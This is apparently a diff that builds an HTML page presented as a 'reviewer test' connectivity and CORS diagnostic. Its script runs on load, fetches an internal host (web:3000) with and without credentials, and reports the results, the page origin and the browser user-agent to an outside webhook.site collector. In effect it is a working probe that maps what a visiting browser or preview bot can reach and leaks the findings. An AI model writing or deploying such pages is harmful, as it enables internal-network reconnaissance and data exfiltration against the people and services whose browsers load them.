@@ -1,34 +1,79 @@
-const webhook =
-  "https://webhook.site/d0fb3065-275d-4046-a057-642fdef33d40";
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>SitePreview Reviewer Test v3</title>
+</head>
+<body>
+  <h1>SitePreview Reviewer Test v3</h1>
+  <p>Browser connectivity and CORS diagnostic</p>
+  <pre id="results">Starting tests...</pre>
 
-function report(event, value) {
-  const params = new URLSearchParams({
-    event,
-    value: String(value),
-    time: new Date().toISOString()
-  });
+  <script>
+    const webhook =
+      "https://webhook.site/d0fb3065-275d-4046-a057-642fdef33d40";
 
-  new Image().src = webhook + "?" + params;
-}
+    const results = document.getElementById("results");
 
-async function testCors(name, credentials) {
-  try {
-    const response = await fetch(
-      "http://web:3000/robots.txt",
-      {
-        mode: "cors",
-        credentials,
-        cache: "no-store"
+    function report(event, value) {
+      const data = {
+        event: event,
+        value: String(value),
+        time: new Date().toISOString()
+      };
+
+      const params = new URLSearchParams(data);
+      const url = webhook + "?" + params.toString();
+
+      const line = event + ": " + value;
+      console.log("[TEST]", line);
+      results.textContent += "\n" + line;
+
+      // Send the diagnostic to Webhook.site.
+      fetch(url, {
+        method: "GET",
+        mode: "no-cors",
+        credentials: "omit",
+        keepalive: true
+      }).catch(error => {
+        console.error("Webhook reporting failed:", error);
+      });
+    }
+
+    async function testCors(name, credentials) {
+      try {
+        const response = await fetch(
+          "http://web:3000/robots.txt",
+          {
+            method: "GET",
+            mode: "cors",
+            credentials: credentials,
+            cache: "no-store",
+            signal: AbortSignal.timeout(8000)
+          }
+        );
+
+        report(name, "status:" + response.status);
+      } catch (error) {
+        report(name, "error:" + error.name);
       }
-    );
+    }
 
-    report(name, "status:" + response.status);
-  } catch (error) {
-    report(name, "error:" + error.name);
-  }
-}
+    async function main() {
+      report("started", location.origin);
 
-report("started", location.origin);
+      report("user-agent", navigator.userAgent);
 
-testCors("cors-omit", "omit");
-testCors("cors-include", "include");
+      await Promise.allSettled([
+        testCors("cors-omit", "omit"),
+        testCors("cors-include", "include")
+      ]);
+
+      report("tests-completed", "yes");
+    }
+
+    main();
+  </script>
+</body>
+</html>
